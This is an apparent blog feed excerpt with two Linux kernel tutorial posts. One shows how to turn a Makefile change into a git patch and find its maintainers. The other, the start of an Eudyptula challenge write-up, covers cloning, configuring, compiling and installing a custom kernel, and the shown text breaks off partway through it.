<p>According to the official kernel docs, people have four different relationships with the kernel Makefiles.</p>
<ul>
<li>Some will simply build kernel using commands like <code>make menuconfig</code> and <code>make</code></li>
<li>Some will work with device drivers or other kernel features and will have to deal with kbuild makefiles for each subsystem they are working on.</li>
<li>A few will be working with architecture specific code and will be responsible for arch makefiles.</li>
<li>And then, there are kbuild developers&hellip;. people who work on the kernel build system itself.</li>
</ul>
<p>There are many things that a kernel developer needs to understand when he/she is working on kernel features. One of those many things is to understand kernel build makefiles. If you want, read more about important segments of a kernel makefile from <a href="https://www.kernel.org/doc/html/latest/kbuild/makefiles.html#the-kbuild-files">official documentations here</a>.<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
<p>Now we know what makefile is, how it works and little bit about kernel makefile. Now the last part of the task - to make a patch of modified Makefile. This is very easy with git&hellip; you know <em>git</em> right?</p>
<p><img loading="lazy" src="https://media.giphy.com/media/hs1wBxNGuR7z2LyzHT/giphy.gif#center" alt=""  />
</p>
<p>Just do <code>git diff Makefile</code> in linux kernel source directory. Executing this command should give you output like below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git a/Makefile b/Makefile
</span></span></span><span class="line"><span class="cl"><span class="gh">index 1a6678d81..25e909b50 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/Makefile
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/Makefile
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -2,7 +2,7 @@
</span></span></span><span class="line"><span class="cl"><span class="gu"></span> VERSION = 5
</span></span><span class="line"><span class="cl"> PATCHLEVEL = 19
</span></span><span class="line"><span class="cl"> SUBLEVEL = 0
</span></span><span class="line"><span class="cl"><span class="gd">-EXTRAVERSION = -rc2
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+EXTRAVERSION = -ExtraVersionText
</span></span></span><span class="line"><span class="cl"><span class="gi"></span> NAME = Superb Owl
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> # *DOCUMENTATION*
</span></span></code></pre></div><p>But this is not a patch&hellip; it is just a diff, showing what things changed. To make a actual patch you need to do more than this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## After modifying the Makefile</span>
</span></span><span class="line"><span class="cl">git add Makefile
</span></span><span class="line"><span class="cl">git commit -m <span class="s2">&#34;Modified Makefile&#34;</span>
</span></span><span class="line"><span class="cl">git format-patch -1 HEAD -- Makefile
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## OUTPUT - 0001-modified-makefile.patch</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># COMMAND -  cat 0001-modified-makefile.patch
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">From 45176125f95a5606ab4334f334634e19492f4928 Mon Sep 17 00:00:00 2001
</span></span><span class="line"><span class="cl">From: ayedaemon &lt;ris3234@gmail.com&gt;
</span></span><span class="line"><span class="cl">Date: Sat, 18 Jun 2022 10:54:16 +0530
</span></span><span class="line"><span class="cl">Subject: [PATCH] modified makefile
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl"> Makefile | 2 +-
</span></span><span class="line"><span class="cl"> 1 file changed, 1 insertion(+), 1 deletion(-)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">diff --git a/Makefile b/Makefile
</span></span><span class="line"><span class="cl">index b815ea3..7d97ece 100644
</span></span><span class="line"><span class="cl">--- a/Makefile
</span></span><span class="line"><span class="cl">+++ b/Makefile
</span></span><span class="line"><span class="cl">@@ -1,6 +1,6 @@
</span></span><span class="line"><span class="cl"> VERSION = 5
</span></span><span class="line"><span class="cl"> PATCHLEVEL = 19
</span></span><span class="line"><span class="cl"> SUBLEVEL = 0
</span></span><span class="line"><span class="cl">-EXTRAVERSION = -rc2
</span></span><span class="line"><span class="cl">+EXTRAVERSION = -ExtraVersionText
</span></span><span class="line"><span class="cl"> NAME = Superb Owl
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">--
</span></span><span class="line"><span class="cl">2.36.1
</span></span></code></pre></div><p>Now this gives you a patch file in an email format. That&rsquo;s convinient if you just want generate a patch and send it to someone using CLI mail client tools. Your work as a bug fixer/ feature developer/ etc is done once you have submitted the patch.</p>
<h4 id="submit-the-patch-but-where">Submit the patch!! But where??</h4>
<p>Linux kernel developers have also made automation scripts for you that actually finds the maintainers for a file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./scripts/get_maintainer.pl -f Makefile
</span></span></code></pre></div><p>Output:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Masahiro</span> <span class="n">Yamada</span> <span class="o">&lt;</span><span class="n">masahiroy</span><span class="err">@</span><span class="n">kernel</span><span class="o">.</span><span class="n">org</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">maintainer</span><span class="p">:</span><span class="n">KERNEL</span> <span class="n">BUILD</span> <span class="o">+</span> <span class="n">files</span> <span class="n">below</span> <span class="n">scripts</span><span class="o">/</span> <span class="p">(</span><span class="n">unless</span> <span class="n">mai</span><span class="o">...</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Michal</span> <span class="n">Marek</span> <span class="o">&lt;</span><span class="n">michal</span><span class="o">.</span><span class="n">lkml</span><span class="err">@</span><span class="n">markovi</span><span class="o">.</span><span class="n">net</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">maintainer</span><span class="p">:</span><span class="n">KERNEL</span> <span class="n">BUILD</span> <span class="o">+</span> <span class="n">files</span> <span class="n">below</span> <span class="n">scripts</span><span class="o">/</span> <span class="p">(</span><span class="n">unless</span> <span class="n">mai</span><span class="o">...</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Nick</span> <span class="n">Desaulniers</span> <span class="o">&lt;</span><span class="n">ndesaulniers</span><span class="err">@</span><span class="n">google</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">reviewer</span><span class="p">:</span><span class="n">KERNEL</span> <span class="n">BUILD</span> <span class="o">+</span> <span class="n">files</span> <span class="n">below</span> <span class="n">scripts</span><span class="o">/</span> <span class="p">(</span><span class="n">unless</span> <span class="n">mai</span><span class="o">...</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Nick</span> <span class="n">Terrell</span> <span class="o">&lt;</span><span class="n">terrelln</span><span class="err">@</span><span class="n">fb</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">maintainer</span><span class="p">:</span><span class="n">ZSTD</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Alexei</span> <span class="n">Starovoitov</span> <span class="o">&lt;</span><span class="n">ast</span><span class="err">@</span><span class="n">kernel</span><span class="o">.</span><span class="n">org</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">supporter</span><span class="p">:</span><span class="n">BPF</span> <span class="p">(</span><span class="n">Safe</span> <span class="n">dynamic</span> <span class="n">programs</span> <span class="ow">and</span> <span class="n">tools</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">Daniel</span> <span class="n">Borkmann</span> <span class="o">&lt;</span><span class="n">daniel</span><span class="err">@</span><span class="n">iogearbox</span><span class="o">.</span><span class="n">net</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">supporter</span><span class="p">:</span><span class="n">BPF</span> <span class="p">(</span><span class="n">Safe</span> <span class="n">dynamic</span> <span class="n">programs</span> <span class="ow">and</span> <span class="n">tools</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">Andrii</span> <span class="n">Nakryiko</span> <span class="o">&lt;</span><span class="n">andrii</span><span class="err">@</span><span class="n">kernel</span><span class="o">.</span><span class="n">org</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">supporter</span><span class="p">:</span><span class="n">BPF</span> <span class="p">(</span><span class="n">Safe</span> <span class="n">dynamic</span> <span class="n">programs</span> <span class="ow">and</span> <span class="n">tools</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">Martin</span> <span class="n">KaFai</span> <span class="n">Lau</span> <span class="o">&lt;</span><span class="n">kafai</span><span class="err">@</span><span class="n">fb</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">reviewer</span><span class="p">:</span><span class="n">BPF</span> <span class="p">(</span><span class="n">Safe</span> <span class="n">dynamic</span> <span class="n">programs</span> <span class="ow">and</span> <span class="n">tools</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">Song</span> <span class="n">Liu</span> <span class="o">&lt;</span><span class="n">songliubraving</span><span class="err">@</span><span class="n">fb</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">reviewer</span><span class="p">:</span><span class="n">BPF</span> <span class="p">(</span><span class="n">Safe</span> <span class="n">dynamic</span> <span class="n">programs</span> <span class="ow">and</span> <span class="n">tools</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">Yonghong</span> <span class="n">Song</span> <span class="o">&lt;</span><span class="n">yhs</span><span class="err">@</span><span class="n">fb</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">reviewer</span><span class="p">:</span><span class="n">BPF</span> <span class="p">(</span><span class="n">Safe</span> <span class="n">dynamic</span> <span class="n">programs</span> <span class="ow">and</span> <span class="n">tools</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">John</span> <span class="n">Fastabend</span> <span class="o">&lt;</span><span class="n">john</span><span class="o">.</span><span class="n">fastabend</span><span class="err">@</span><span class="n">gmail</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">reviewer</span><span class="p">:</span><span class="n">BPF</span> <span class="p">(</span><span class="n">Safe</span> <span class="n">dynamic</span> <span class="n">programs</span> <span class="ow">and</span> <span class="n">tools</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">KP</span> <span class="n">Singh</span> <span class="o">&lt;</span><span class="n">kpsingh</span><span class="err">@</span><span class="n">kernel</span><span class="o">.</span><span class="n">org</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">reviewer</span><span class="p">:</span><span class="n">BPF</span> <span class="p">(</span><span class="n">Safe</span> <span class="n">dynamic</span> <span class="n">programs</span> <span class="ow">and</span> <span class="n">tools</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">Nathan</span> <span class="n">Chancellor</span> <span class="o">&lt;</span><span class="n">nathan</span><span class="err">@</span><span class="n">kernel</span><span class="o">.</span><span class="n">org</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">supporter</span><span class="p">:</span><span class="n">CLANG</span><span class="o">/</span><span class="n">LLVM</span> <span class="n">BUILD</span> <span class="n">SUPPORT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Tom</span> <span class="n">Rix</span> <span class="o">&lt;</span><span class="n">trix</span><span class="err">@</span><span class="n">redhat</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">reviewer</span><span class="p">:</span><span class="n">CLANG</span><span class="o">/</span><span class="n">LLVM</span> <span class="n">BUILD</span> <span class="n">SUPPORT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">linux</span><span class="o">-</span><span class="n">kbuild</span><span class="err">@</span><span class="n">vger</span><span class="o">.</span><span class="n">kernel</span><span class="o">.</span><span class="n">org</span> <span class="p">(</span><span class="n">open</span> <span class="n">list</span><span class="p">:</span><span class="n">KERNEL</span> <span class="n">BUILD</span> <span class="o">+</span> <span class="n">files</span> <span class="n">below</span> <span class="n">scripts</span><span class="o">/</span> <span class="p">(</span><span class="n">unless</span> <span class="n">mai</span><span class="o">...</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">linux</span><span class="o">-</span><span class="n">kernel</span><span class="err">@</span><span class="n">vger</span><span class="o">.</span><span class="n">kernel</span><span class="o">.</span><span class="n">org</span> <span class="p">(</span><span class="n">open</span> <span class="n">list</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">netdev</span><span class="err">@</span><span class="n">vger</span><span class="o">.</span><span class="n">kernel</span><span class="o">.</span><span class="n">org</span> <span class="p">(</span><span class="n">open</span> <span class="n">list</span><span class="p">:</span><span class="n">BPF</span> <span class="p">(</span><span class="n">Safe</span> <span class="n">dynamic</span> <span class="n">programs</span> <span class="ow">and</span> <span class="n">tools</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">bpf</span><span class="err">@</span><span class="n">vger</span><span class="o">.</span><span class="n">kernel</span><span class="o">.</span><span class="n">org</span> <span class="p">(</span><span class="n">open</span> <span class="n">list</span><span class="p">:</span><span class="n">BPF</span> <span class="p">(</span><span class="n">Safe</span> <span class="n">dynamic</span> <span class="n">programs</span> <span class="ow">and</span> <span class="n">tools</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">llvm</span><span class="err">@</span><span class="n">lists</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">dev</span> <span class="p">(</span><span class="n">open</span> <span class="n">list</span><span class="p">:</span><span class="n">CLANG</span><span class="o">/</span><span class="n">LLVM</span> <span class="n">BUILD</span> <span class="n">SUPPORT</span><span class="p">)</span>
</span></span></code></pre></div><p>The above list gives you the recipients list for you patch. Before submitting your patch, please read <a href="https://www.kernel.org/doc/html/latest/process/submitting-patches.html">the official kernel documentations</a><sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> to know mode about the patch submissions.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/fvmbkNjNwBlHCG3Yin/giphy.gif#center" alt=""  />
</p>
<h4 id="how-do-they-apply-my-patch">how do they apply my patch??</h4>
<p>Maintainers (or the person you just submitted your patch) will check your patch and if everything is good, they&rsquo;ll apply your patch to their codebase.</p>
<p><code>git</code> provides an easy way to do that using the patch file&hellip; just type below command and the patch will be applied.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git apply 0001-modified-makefile.patch
</span></span></code></pre></div><h3 id="conclusion">Conclusion</h3>
<p>Linux kernel is very huge project which involves tons of people. This looks very chaotic and scary, but it works!! Among many other tools/scripts, <strong>Git</strong> and <strong>Makefiles</strong> are the 2 important tools this chaotic process relies upon. One should have good understanding about these tools to take part in the development process of kernel.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://www.kernel.org/doc/html/latest/kbuild/makefiles.html#the-kbuild-files">https://www.kernel.org/doc/html/latest/kbuild/makefiles.html#the-kbuild-files</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://www.kernel.org/doc/html/latest/process/submitting-patches.html">https://www.kernel.org/doc/html/latest/process/submitting-patches.html</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Eudyptula Task2</title>
      <link>https://ayedaemon.github.io/post/2022/06/eudyptula-task-2/</link>
      <pubDate>Wed, 01 Jun 2022 15:14:27 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2022/06/eudyptula-task-2/</guid>
      <description>Task 2 for Eudyptula challenge</description>
      <content:encoded><![CDATA[<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">This is Task 02 of the Eudyptula Challenge
</span></span><span class="line"><span class="cl">------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Now that you have written your first kernel module, it&#39;s time to take
</span></span><span class="line"><span class="cl">off the training wheels and move on to building a custom kernel.  No
</span></span><span class="line"><span class="cl">more distro kernels for you, for this task you must run your own kernel.
</span></span><span class="line"><span class="cl">And use git!  Exciting isn&#39;t it!  No, oh, ok...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The tasks for this round is:
</span></span><span class="line"><span class="cl">  - download Linus&#39;s latest git tree from git.kernel.org (you have to
</span></span><span class="line"><span class="cl">    figure out which one is his, it&#39;s not that hard, just remember what
</span></span><span class="line"><span class="cl">    his last name is and you should be fine.)
</span></span><span class="line"><span class="cl">  - build it, install it, and boot it.  You can use whatever kernel
</span></span><span class="line"><span class="cl">    configuration options you wish to use, but you must enable
</span></span><span class="line"><span class="cl">    CONFIG_LOCALVERSION_AUTO=y.
</span></span><span class="line"><span class="cl">  - show proof of booting this kernel.  Bonus points for you if you do
</span></span><span class="line"><span class="cl">    it on a &#34;real&#34; machine, and not a virtual machine (virtual machines
</span></span><span class="line"><span class="cl">    are acceptable, but come on, real kernel developers don&#39;t mess
</span></span><span class="line"><span class="cl">    around with virtual machines, they are too slow.  Oh yeah, we aren&#39;t
</span></span><span class="line"><span class="cl">    real kernel developers just yet.  Well, I&#39;m not anyway, I&#39;m just a
</span></span><span class="line"><span class="cl">    script...)  Again, proof of running this kernel is up to you, I&#39;m
</span></span><span class="line"><span class="cl">    sure you can do well.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hint, you should look into the &#39;make localmodconfig&#39; option, and base
</span></span><span class="line"><span class="cl">your kernel configuration on a working distro kernel configuration.
</span></span><span class="line"><span class="cl">Don&#39;t sit there and answer all 1625 different kernel configuration
</span></span><span class="line"><span class="cl">options by hand, even I, a foolish script, know better than to do that!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">After doing this, don&#39;t throw away that kernel and git tree and
</span></span><span class="line"><span class="cl">configuration file.  You&#39;ll be using it for later tasks, a working
</span></span><span class="line"><span class="cl">kernel configuration file is a precious thing, all kernel developers
</span></span><span class="line"><span class="cl">have one they have grown and tended to over the years.  This is the
</span></span><span class="line"><span class="cl">start of a long journey with yours, don&#39;t discard it like was a broken
</span></span><span class="line"><span class="cl">umbrella, it deserves better than that.
</span></span></code></pre></div><h1 id="what-why">What, why?</h1>
<p>Kernel is the main component of any operating system and is also referred as  the &ldquo;Heart of the Operating System&rdquo;. It is at the core of all the layers present in OS and can have complete access to all the hardware (CPU, disk, RAM, etc). Therefore, it runs on very high privileges. Basically it handles most of the hardware related tasks (Allocate memory, CPU scheduling, etc) and most of the process related tasks (Copying file from/to disk, Uploading/Downloading, opening browser to read this blog, etc)</p>
<p><strong>Wait, what? Does it have control to everything we do on our computers?</strong></p>
<p>A big YES and small no. It is responsible to send data across multiple resources in your system and it can intercept everything there. But it depends if it can understand what it sees.</p>
<p>Kernel has mainly 4 tasks:</p>
<ol>
<li>Keep track of the memory - who is using it and how much; And where.</li>
<li>Decides who uses CPU, when and for how long</li>
<li>Takes data from processes and passes sensible code to hardware for processing it and vise-versa.</li>
<li>Receives requests via system calls (API calls; but not Web API calls) from processes. This is used to do low level stuff and build amazing tools like docker.</li>
</ol>
<p>Talking to kernel is difficult and can be dangerous if not used properly. Most of the times, user does not need to talk to kernel directly, and have got few layers of abstraction on top of it - Device drivers, system libraries, CLI shells, GUI shells (Graphical thing which comes up, when you start your system), etc.</p>
<p>This gives rise to the idea of 2 spaces - user space and kernel space. Kernel space is the memory segment that is used only by kernel and users stay out of it. Another is user space memory segment, where user can do all what he wants.</p>
<p>The rough mind map would look something like below</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[ [ [ [Hardware] --&gt; Kernel ] --&gt; OS ]  --&gt; Process(browser)]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># If process fails in OS, damage is small and might be recovered by kernel.
</span></span><span class="line"><span class="cl"># If kernel crashes, Your system goes down.
</span></span><span class="line"><span class="cl"># If hardware fails, you cry!!
</span></span></code></pre></div><p>This is the complete bundle which makes up your system.  Now what I want to take out of this whole jibber-jabber is that a <strong>kernel</strong> is a <strong><em>piece of software</em></strong> that works with hardware and other user-friendly softwares to solve your problems or play games and have fun.</p>
<p>Since it is a piece of software, we can download it and replace old versions with new versions (manually or via a script/program/whatever). Another option for tech savvy people is to custom compile it. There could be many reasons to compile a linux kernel by yourself, few possible reasons are:-</p>
<ul>
<li>You want to know how it is done.</li>
<li>You might want to brag about it and feel superior and very tech savvy.</li>
<li>You want to face &ldquo;I use arch BTW&rdquo; community. (FYI, I use arch BTW!!)</li>
<li>You want optimal performance on specific hardware and architecture.</li>
<li>You might want to disable/enable some kernel features.</li>
<li>You might want to add support for extra hardware.</li>
<li>You are solving eudyptula challenge, just like me :)</li>
</ul>
<p>Regardless of why, knowing how to compile a linux kernel is very useful and cool.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/dCLyraFCJhaLUsG3dX/giphy.gif#center" alt=""  />
</p>
<h3 id="getting-the-source-code-for-kernel">Getting the source code for kernel.</h3>
<p>Getting source code for kernel is very easy. You just need to go to <a href="https://kernel.org/">kernel.org</a> and download the required files. I&rsquo;ll be compiling <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/">Linus Torvalds&rsquo;s git tree</a> source code on <code>archlinux/archlinux</code> vagrant box.<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Use git to download the linux kernel source code. (just the latest commit =&gt; --depth=1)</span>
</span></span><span class="line"><span class="cl">git clone --depth<span class="o">=</span><span class="m">1</span> git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git
</span></span></code></pre></div><p>Linux kernel is very huge software and might take up a minute to download (depends upon your connectivity). This is one of the reasons for why most of the extended functionalities are provided via loadable kernel modules. If you don&rsquo;t know about kernel modules the read <a href="https://ayedaemon.github.io/post/eudyptula/eudyptula-task-1/">Eudyptula Task1</a> blog.</p>
<p>Inside the cloned directory, we have multiple files and sub-directories. Each sub-directory is for specified purpose like <code>arch</code> contains files for different system architecture and <code>security</code> contains files for <code>selinux</code> , <code>apparmor</code> and other security related files. In short, linux kernel is developed by thousands of developers in collaboration and not everybody knows about each file present in the source code and yet they have an understanding of where they have to make changes to achieve their goal. Very neat management!!</p>
<h3 id="compiling-linux-kernel">Compiling Linux kernel</h3>
<p>Just like every configurable software, linux kernel also provide configuration support via <code>.config</code> file. We can either use other kernel&rsquo;s config file or write a config file by ourselves.</p>
<h4 id="creating-own-config-file-from-scratch">Creating own config file from scratch</h4>
<p>Creating own config file from scratch can be a bad idea for someone who is doing it for very first time. But if you still want to do it, I&rsquo;m not gonna stop you. You can make the use of <code>Makefile</code> by typing <code>make config</code> from inside the kernel source code directory and then you&rsquo;ll have to simply answer <code>yes or no</code> for all the configurable options that kernel supports. <a href="https://www.linuxtopia.org/online_books/linux_kernel/kernel_configuration/ch05.html#id2564226">Read more here</a></p>
<h4 id="using-existing-config-file">Using existing config file</h4>
<p>You can copy the config file of your existing kernel and use it as a base config to make further changes. This is a very efficient method if there are only few changes you need to make. Most of the kernel developers have their own config files which they have fine-tuned in so many years. To know about how to get config file for your linux system <a href="https://superuser.com/questions/287371/obtain-kernel-config-from-currently-running-linux-system">read this stackoverflow thread</a>. For my vagrant system, I can check my running kernel&rsquo;s config file using below command</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls /proc/config.gz
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">zcat /proc/config.gz  <span class="p">|</span> grep  <span class="s2">&#34;.*CONFIG_&#34;</span> <span class="p">|</span> wc -l
</span></span><span class="line"><span class="cl"><span class="c1"># Output = 9128</span>
</span></span></code></pre></div><p>There are total <code>9128</code> configurable options here and it is very impractical to make all the proper changes with a text editor in one go, so  instead, we will do it with some <a href="https://en.wikipedia.org/wiki/Text-based_user_interface">TUI script</a>. Below script will copy the config file to working directory and start the TUI for you. Navigate to <code>linux</code> source code directory and run the below script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy config file and take a backup for later review</span>
</span></span><span class="line"><span class="cl">zcat /proc/config.gz &gt; .config
</span></span><span class="line"><span class="cl">cp .config ../old.config
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Install requirements to run `make menuconfig`</span>
</span></span><span class="line"><span class="cl">sudo pacman -S --noconfirm --needed<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	pkg-config ncurses <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	gcc <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	flex <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	bison
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Update config file.</span>
</span></span><span class="line"><span class="cl">make menuconfig
</span></span></code></pre></div><p>Linux kernel has a lot of make options and the best way to check supporting make options is via <code>make help</code> command. After executing <code>make menuconfig</code>, a TUI will open in shell which will help you to update, save and load the new configuration. This command uses the <code>.config</code> file from current directory to pre-fill the old config options, this makes it very easy for us to just focus on what we want to change.</p>
<p>For my config file, I simply enabled the <code>CONFIG_PRINTK_CALLER</code>   and <code>CONFIG_LOCALVERSION_AUTO</code> features of the kernel&hellip; and then saved the file with a filename - <code>new.config</code> (I want to keep it backed up for future tasks). We can compare the changed values from the old <code>.config</code> and newer <code>new.config</code> and see the difference.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">diff .config ../old.config  <span class="p">|</span> grep -i -E <span class="s1">&#39;localver|printk&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#   &lt; CONFIG_LOCALVERSION=&#34;ayedaemon&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   &gt; CONFIG_LOCALVERSION=&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   &lt; CONFIG_PRINTK_CALLER=y</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   &gt; # CONFIG_PRINTK_CALLER is not set</span>
</span></span></code></pre></div><p>Now we have very few steps left to be done. We need to <strong><em>compile the kernel</em></strong>, then <strong><em>install modules</em></strong> and finally, <strong><em>install kerrnel</em></strong>. Run below commands to get this done.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Update .config with newer config file
</span></span><span class="line"><span class="cl">mv -v new.config .config
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Backup the newer config file
</span></span><span class="line"><span class="cl">cp -v .config ../new.config
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Install some more dependencies
</span></span><span class="line"><span class="cl">sudo pacman -S --noconfirm --needed \
</span></span><span class="line"><span class="cl">	bc \
</span></span><span class="line"><span class="cl">	cpio   # If on arch based distro or using my vagrantfile
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Compile kernel (might require your input) - use -j4 to make it build faster
</span></span><span class="line"><span class="cl">make -j4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Install modules (takes some time) - user -j4 to make it build faster
</span></span><span class="line"><span class="cl">sudo make modules_install -j4
</span></span></code></pre></div><p>If you are use LILO bootloader, then the kernel make file will do the job for you with this command - <code>sudo make install</code>. But if you are using GRUB, then you will have to make some manual steps by running below commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Copy kernel image to /boot
</span></span><span class="line"><span class="cl">sudo cp arch/x86_64/boot/bzImage /boot/vmlinuz-ayedaemonlinux
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Copy system.map to /boot
</span></span><span class="line"><span class="cl">sudo cp System.map /boot/System-ayedaemonlinux.map
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Copy config file to /boot (just to be safe)
</span></span><span class="line"><span class="cl">sudo cp .config /boot/ayedaemonlinux.kernel.config
</span></span></code></pre></div><p>Let&rsquo;s take a minute to see what we just did. After we configured the linux kernel using <code>make</code> and <code>.config</code> file, we compiled the kernel with our configuration requirements and then installed all the modules required. Once this is done, we got 2 important files we need :-</p>
<ol>
<li><code>vmlinuz</code> =&gt; Is the actual kernel file. Yes it is the kernel you were waiting for so long. If you fancy, do 	<code>file /boot/vmlinuz-ayedaemonlinux</code> and check the results.</li>
<li><code>System.map</code> =&gt; This is the map file which stores the kernel symbol table information. <a href="https://rlworkman.net/system.map/">Read more about it here</a></li>
</ol>
